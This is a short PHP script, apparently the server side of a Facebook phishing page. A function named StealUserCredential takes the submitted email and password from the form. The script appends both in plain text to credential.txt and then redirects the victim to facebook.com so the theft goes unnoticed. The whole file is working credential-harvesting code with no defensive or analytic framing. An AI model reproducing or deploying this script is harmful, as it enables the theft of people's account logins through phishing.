<?php
	
	
	
	StealUserCredential();
	WriteCredential();
	
	
	
	//function which is use to access user credentials...
	function StealUserCredential(){
		
		//storing email and password to variables through POST method...
		$GLOBALS['email'] = $_POST["email"];
		$GLOBALS['password'] = $_POST["pass"];
		
		//echo "$email";
		//echo "$password";
	}
	
	//funtion which is use to write user credentials to credential.txt...
	function WriteCredential(){
		
		//opening of credential.txt with writing only privilege...
		 $credentials = fopen("credential.txt", "a") or die("Unable to open file!"); 
		 
		//writing credentials to credential.txt... 
		 $txt = "EMAIL = $GLOBALS[email] , PASSWORD = $GLOBALS[password]\n";  
		 fwrite($credentials, "\r\n".$txt);
		 
		//closing of credential.txt...
		 fclose($credentials); 
		 
		 
	}
	header("Location:https://www.facebook.com/");
	exit();
?>